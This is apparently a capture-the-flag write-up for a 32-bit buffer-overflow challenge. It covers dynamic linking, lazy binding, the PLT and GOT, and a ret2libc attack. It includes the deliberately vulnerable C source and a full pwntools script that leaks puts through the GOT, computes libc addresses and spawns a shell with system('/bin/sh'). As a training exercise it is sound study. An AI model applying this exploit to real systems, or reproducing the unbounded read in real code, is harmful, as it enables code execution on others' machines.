# ROP Dynamic

## Source Code

```C
/*gcc -m32 -fno-stack-protector -no-pie -o vuln vuln.c*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFFSIZE 136

void vuln(){
    puts("Rop basic!!!");
    char buffer[BUFFSIZE];
    read(0,buffer,0x200);
}

int main(){
    vuln();
}
```

> This challenge runs with ASLR has value 2, which means the offset in libc will be randomized every time we run.
> But it has no PIE, and has a really cute puts in vuln, which I will play with :3

## Overview & Idea

- This challenge has no get shell function or win, so we need to find some function to get the shell.
- To do it, we need to leak the address of function like puts and its offset to calculate the base address of libc, we also need system address and "/bin/sh" string to get shell.

## Detail

### Dynamically linked library

- Before we go more insight, we need to have some basic knowledge about "How does dynamically linked library works?"

- There are (in most cases, discounting interpreted code) two stages in getting from source code (what you write) to executable code (what you run).

- The first is compilation which turns source code into object modules.

- The second, linking, is what combines object modules together to form an executable.

- The distinction is made for, among other things, allowing third party libraries to be included in your executable without you seeing their source code (such as libraries for database access, network communications and graphical user interfaces), or for compiling code in different languages (C and assembly code for example) and then linking them all together.

- When you statically link a file into an executable, the contents of that file are included at link time. In other words, the contents of the file are physically inserted into the executable that you will run.

- When you link dynamically, a pointer to the file being linked in (the file name of the file, for example) is included in the executable and the contents of said file are not included at link time. It's only when you later run the executable that these dynamically linked files are bought in and they're only bought into the in-memory copy of the executable, not the one on disk. Which means we don't know in advanced the address of functions resides in library that linked into our executable file.

```
Phase     Static                    Dynamic
--------  ----------------------    ------------------------
          +---------+               +---------+
          | main.c  |               | main.c  |
          +---------+               +---------+
Compile........|.........................|...................
          +---------+ +---------+   +---------+ +--------+
          | main.o  | | crtlib  |   | main.o  | | crtimp |
          +---------+ +---------+   +---------+ +--------+
Link...........|..........|..............|...........|.......
               |          |              +-----------+
               |          |              |
          +---------+     |         +---------+ +--------+
          |  main   |-----+         |  main   | | crtdll |
          +---------+               +---------+ +--------+
Load/Run.......|.........................|..........|........
          +---------+               +---------+     |
          | main in |               | main in |-----+
          | memory  |               | memory  |
          +---------+               +---------+
```

- Above just a simplicity about DLL, check this [link](https://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries#:~:text=Load%2Dtime%20relocation%20is%20one,when%20loading%20them%20into%20memory.)

### **The lazy binding optimization**

- When a shared library refers to some function, the real address of that function is not known until load time. Resolving this address is called binding, and it's something the dynamic loader does when it loads the shared library into the process's memory space. This binding process is non-trivial, since the loader has to actually look up the function symbol in special tables.

- Resolving each function takes time. Not a lot of time, but it adds up since the amount of functions in libraries is typically much larger than the amount of global variables. Moreover, most of these resolutions are done in vain, because in a typical run of a program only a fraction of functions actually get called (think about various functions handling error and special conditions, which typically don't get called at all).

- So, to speed up this process, a clever lazy binding scheme was devised. "Lazy" is a generic name for a family of optimizations in computer programming, where work is delayed until the last moment when it's actually needed, with the intention of avoiding doing this work if its results are never required during a specific run of a program. Good examples of laziness are copy-on-write and lazy evaluation.

- This lazy binding scheme is attained by adding yet another level of indirection - the PLT.

### **The Procedure Linkage Table (PLT)**
- The PLT is part of the executable text section, consisting of a set of entries (one for each external function the shared library calls). Each PLT entry is a short chunk of executable code. Instead of calling the function directly, the code calls an entry in the PLT, which then takes care to call the actual function. This arrangement is sometimes called a "trampoline". Each PLT entry also has a corresponding entry in the GOT which contains the actual offset to the function, but only when the dynamic loader resolves it. I know this is confusing, but hopefully it will be come clearer once I explain the details in the next few paragraphs and diagrams.

- As the previous section mentioned, PLTs allow lazy resolution of functions. When the shared library is first loaded, the function calls have not been resolved yet:

![img](/ROP/Dynamic/bi0s/assets/PLT_actions.png)

### **Explanation:**

- In the code, a function func is called. The compiler translates it to a call to func@plt, which is some N-th entry in the PLT.
- The PLT consists of a special first entry, followed by a bunch of identically structured entries, one for each function needing resolution.
- Each PLT entry but the first consists of these parts:
  + A jump to a location which is specified in a corresponding GOT entry
  + Preparation of arguments for a "resolver" routine
  + Call to the resolver routine, which resides in the first entry of the PLT
- The first PLT entry is a call to a resolver routine, which is located in the dynamic loader itself. This routine resolves the actual address of the function. More on its action a bit later.
- Before the function's actual address has been resolved, the Nth GOT entry just points to after the jump. This is why this arrow in the diagram is colored differently, it's not an actual jump, just a pointer.
- What happens when func is called for the first time is this:

  + PLT[n] is called and jumps to the address pointed to in GOT[n].
  + This address points into PLT[n] itself, to the preparation of arguments for the resolver.
  + The resolver is then called.
  + The resolver performs resolution of the actual address of func, places its actual address into GOT[n] and calls func.

- After the first call, the diagram looks a bit differently:

![img](/ROP/Dynamic/bi0s/assets/PLT_actions_2.png)

- Note that GOT[n] now points to the actual func instead of back into the PLT. So, when func is called again:
  + PLT[n] is called and jumps to the address pointed to in GOT[n].
  + GOT[n] points to func, so this just transfers control to func.

> ### Above is reference from this [link](https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries)
> ### So, we must make some action to leak the puts function that resides in shared library. Let's do it

### Testing

- Disassemble puts and we have this:

![img](/ROP/Dynamic/bi0s/assets/disass_puts.png)

- So `0x08049080` is address of puts entry in plt, it jumps to dereference of `0x804c010` in data segment, when I check the value it references:

![img](/ROP/Dynamic/bi0s/assets/puts_disass_2.png)

- Check the instruction with this address `0x08049050` I found:

![img](/ROP/Dynamic/bi0s/assets/puts_disass_3.png)

- It jumps back to instruction that has address before puts@plt, This is has something similar with informations I found above in shared library :3

- Oke, let's run through puts calling and check the address `0x804c010`:

![img](/ROP/Dynamic/bi0s/assets/disass_puts_4.png)

- Yea, content of `0x804c010` has change to address of puts in libc is `0xf7e304e0`, this address is affected by ASLR which is random every time we run the program. 
- So, it works exactly like what we talk in above about shared library. Let's write some script exploit this chall :3

## Exploit


- First, we find offset of puts system with pwndbg:

![img](/ROP/Dynamic/bi0s/assets/puts_offset.png)

- And offset that we must overwrite is 148 bytes, I found it with magical power :3.

- Then, we must know puts address that randomizes by ASLR. We can leak it by pass the puts@plt address to puts function like an argument after the first call of puts, then we receive the result bytes that is address of puts in libc we want.

- After that, we can calculate the base address of libc and calculate the address of system, then "/bin/sh".

- Finally, get shell :3

```python
# filename: exp2.py 
from pwn import *

elf = ELF("./vuln")

p = elf.process()

# with no PIE so we can use address that we take from gdb
puts_plt = 0x08049080
vuln_addr = 0x080491b6
puts_got = 0x804c010

# offset
binsh_offset = 0x18cb62    # using find libc, libc + offset, "/bin/sh" la ra :3
puts_offset = 0x6c4e0 
sys_offset = 0x41d00

padding = b"a"*148

# payload 1: leak the address of puts in libc
payload_1 = padding
payload_1 += p32(puts_plt)
payload_1 += p32(vuln_addr)
payload_1 += p32(puts_got)

p.sendline(payload_1)

# puts will print '\n' so we need to recvline() after recv the 4 bytes address of puts
p.recvline()

# get address of puts in libc
leak = p.recv(4)

# turn it into int32
puts_real = u32(leak)

# calculate the base address of libc
base_addr = puts_real - puts_offset

# calculte the address of system() and "/bin/sh"
sys_real = base_addr + sys_offset
binsh_real = base_addr + binsh_offset

# payload2 gets the shell
payload_2 = padding
payload_2 += p32(sys_real)
payload_2 += b"aaaa"
payload_2 += p32(binsh_real)

p.recvuntil("Rop basic!!!")
p.sendline(payload_2)

p.interactive()
```

## Result

![img](/ROP/Dynamic/bi0s/assets/result.png)
